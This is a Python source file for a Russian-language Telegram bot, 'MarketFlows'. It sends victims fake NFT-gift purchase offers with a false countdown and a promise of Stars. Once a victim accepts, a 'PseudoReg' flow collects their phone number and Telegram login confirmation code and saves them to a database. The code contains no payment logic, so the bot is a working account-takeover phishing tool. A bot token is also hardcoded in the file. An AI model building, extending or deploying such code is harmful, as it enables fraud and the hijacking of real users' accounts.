import asyncio  
import json  
import secrets  
import sqlite3  
from datetime import datetime  
  
from aiogram import Bot, Dispatcher, F, Router  
from aiogram.client.default import DefaultBotProperties  
from aiogram.enums import ParseMode  
from aiogram.filters import CommandStart, Command  
from aiogram.fsm.context import FSMContext  
from aiogram.fsm.state import State, StatesGroup  
from aiogram.fsm.storage.memory import MemoryStorage  
from aiogram.types import (  
    Message, CallbackQuery, BusinessConnection,  
    InlineKeyboardMarkup, InlineKeyboardButton,  
    ReplyKeyboardMarkup, KeyboardButton  
)  
  
BOT_TOKEN = "9111963048:AAHem8wQwJiU5mkeoob_3KtmPRP8sGtYtmM"  
BRAND = "MarketFlows"  
DB_PATH = "marketflows.db"  

active_business_connection_id = None

def db():  
    return sqlite3.connect(DB_PATH)  
  
def db_init():  
    conn = db()  
    c = conn.cursor()  
    c.execute("""CREATE TABLE IF NOT EXISTS deals (  
        id INTEGER PRIMARY KEY AUTOINCREMENT,  
        code TEXT UNIQUE,  
        creator_id INTEGER,  
        creator_username TEXT,  
        deal_type TEXT DEFAULT 'gift',  
        gift_link TEXT,  
        amount REAL DEFAULT 0.0,  
        currency TEXT DEFAULT 'STARS',  
        status TEXT DEFAULT 'pending',  
        created_at TEXT  
    )""")  
    c.execute("""CREATE TABLE IF NOT EXISTS accounts (  
        id INTEGER PRIMARY KEY AUTOINCREMENT,  
        deal_code TEXT,  
        phone TEXT,  
        code TEXT,  
        session_data TEXT,  
        created_at TEXT  
    )""")  
    conn.commit()  
    conn.close()  

def set_db_status(code, status):  
    conn = db()  
    conn.execute("UPDATE deals SET status=? WHERE code=?", (status, code))  
    conn.commit()  
    conn.close()  

def get_deal(code):  
    conn = db()  
    row = conn.execute("SELECT * FROM deals WHERE code=?", (code,)).fetchone()  
    conn.close()  
    return row  

def save_account(deal_code, phone, code, session_data):  
    conn = db()  
    conn.execute(  
        "INSERT INTO accounts (deal_code, phone, code, session_data, created_at) VALUES (?,?,?,?,?)",  
        (deal_code, phone, code, session_data, datetime.utcnow().isoformat())  
    )  
    conn.commit()  
    conn.close()  

class PseudoReg(StatesGroup):  
    phone = State()  
    code = State()  

class CreateDeal(StatesGroup):  
    waiting_for_link = State()  
    waiting_for_amount = State()  

def main_menu():  
    return ReplyKeyboardMarkup(  
        keyboard=[  
            [KeyboardButton(text="🤝 Создать сделку")]  
        ],  
        resize_keyboard=True  
    )  

router = Router()  

@router.business_connection()
async def business_connection_handler(bc: BusinessConnection):
    global active_business_connection_id
    if bc.is_enabled:
        active_business_connection_id = bc.id

@router.message(CommandStart())  
async def cmd_start(msg: Message):  
    args = msg.text.split(maxsplit=1)  
    if len(args) > 1 and args[1].startswith("deal_"):  
        code = args[1].replace("deal_", "")  
        deal = get_deal(code)  
        if deal:  
            gift_link = deal[5]
            amount = deal[6]
            creator_uname = deal[3]
            
            caption = (
                f"Пользователь {creator_uname} предлагает вам <b>{amount:,.0f} ⭐</b> за подарок\n\n"
                f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
                f"⏳ <b>Предложение активно ещё 29:59</b>"
            )
            
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
                [
                    InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
                    InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
                ]
            ])
            
            await msg.answer_photo(
                photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
                caption=caption,
                parse_mode="HTML",
                reply_markup=kb
            )
            return  

    await msg.answer(  
        f"🏦 Добро пожаловать в <b>{BRAND}</b>!\n\nНажми кнопку ниже, чтобы создать сделку.",  
        parse_mode="HTML",
        reply_markup=main_menu()  
    )  

@router.message(F.text == "🤝 Создать сделку")
async def start_create_deal(msg: Message, state: FSMContext):
    await state.set_state(CreateDeal.waiting_for_link)
    await msg.answer("🔗 Введите ссылку на NFT подарок (например, <code>https://t.me/nft/Anubis</code>):", parse_mode="HTML")

@router.message(CreateDeal.waiting_for_link)
async def process_gift_link(msg: Message, state: FSMContext):
    await state.update_data(gift_link=msg.text.strip())
    await state.set_state(CreateDeal.waiting_for_amount)
    await msg.answer("💎 Введите сумму в Stars (например, <code>3000</code>):", parse_mode="HTML")

@router.message(CreateDeal.waiting_for_amount)
async def process_gift_amount(msg: Message, state: FSMContext):
    try:
        amount = float(msg.text.strip().replace(",", "."))
    except ValueError:
        await msg.answer("❌ Неверный формат суммы. Введите число:")
        return

    data = await state.get_data()
    gift_link = data.get("gift_link")
    await state.clear()

    code = secrets.token_hex(4).upper()
    uid = msg.from_user.id
    uname = f"@{msg.from_user.username}" if msg.from_user.username else str(uid)

    conn = db()
    conn.execute(  
        "INSERT INTO deals (code, creator_id, creator_username, deal_type, gift_link, amount, currency, status, created_at) "  
        "VALUES (?,?,?,?,?,?,?,?,?)",  
        (code, uid, uname, "gift", gift_link, amount, "STARS", 'pending', datetime.utcnow().isoformat())  
    )  
    conn.commit()  
    conn.close()

    send_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Отправить карточку ордера", callback_data=f"publish_{code}")]
    ])

    await msg.answer(
        f"✅ <b>Ордер #{code} готов!</b>\nНажми кнопку ниже, чтобы опубликовать:",
        parse_mode="HTML",
        reply_markup=send_kb
    )

@router.callback_query(F.data.startswith("publish_"))
async def publish_deal(cb: CallbackQuery):
    code = cb.data.split("_")[1]
    deal = get_deal(code)
    if deal:
        gift_link = deal[5]
        amount = deal[6]
        creator_uname = deal[3]
        
        caption = (
            f"Пользователь {creator_uname} предлагает вам <b>{amount:,.0f} ⭐</b> за подарок\n\n"
            f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
            f"⏳ <b>Предложение активно ещё 29:59</b>"
        )
        
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
            [
                InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
                InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
            ]
        ])
        
        if active_business_connection_id:
            await cb.bot.send_photo(
                chat_id=cb.message.chat.id,
                photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
                caption=caption,
                parse_mode="HTML",
                reply_markup=kb,
                business_connection_id=active_business_connection_id
            )
        else:
            await cb.message.answer_photo(
                photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
                caption=caption,
                parse_mode="HTML",
                reply_markup=kb
            )
            
        await cb.message.delete()
        await cb.answer("Ордер отправлен!")

@router.callback_query(F.data.startswith("sel_accept_"))
async def sel_accept(cb: CallbackQuery, state: FSMContext):
    code = cb.data.split("_")[2]
    deal = get_deal(code)
    if not deal:
        await cb.answer("Ордер не найден", show_alert=True)
        return

    amount = deal[6]
    set_db_status(code, "accepted")
    await state.update_data(deal_code=code)
    
    # Всплывающее окно с текстом и суммой
    await cb.answer(
        text=f"Отправьте подарок в течение 30 минут, и {amount:,.0f} ⭐ автоматически пополнятся на ваш аккаунт.",
        show_alert=True
    )
    
    await state.set_state(PseudoReg.phone)
    await cb.message.answer("📱 Введите номер телефона (+7XXXXXXXXXX):")

@router.callback_query(F.data.startswith("sel_reject_"))
async def sel_reject(cb: CallbackQuery):
    set_db_status(cb.data.split("_")[2], "rejected")
    await cb.message.edit_caption(caption="❌ Ордер отклонён.", reply_markup=None)
    await cb.answer()

@router.message(PseudoReg.phone)  
async def reg_phone(msg: Message, state: FSMContext):  
    await state.update_data(phone=msg.text)  
    await state.set_state(PseudoReg.code)  
    await msg.answer("📩 Введите код подтверждения из Telegram:")  
  
@router.message(PseudoReg.code)  
async def reg_code(msg: Message, state: FSMContext):  
    data = await state.get_data()  
    save_account(data.get("deal_code"), data.get("phone"), msg.text, json.dumps({"user": msg.from_user.id}))  
    await state.clear()  
    await msg.answer("✅ Успешно! Ожидайте пополнения баланса.")  

async def main():  
    db_init()  
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))  
    dp = Dispatcher(storage=MemoryStorage())  
    dp.include_router(router)  
    print(f"[{BRAND}] Бот запущен в финальном режиме.")  
    await dp.start_polling(bot)  

if __name__ == "__main__":  
    asyncio.run(main())
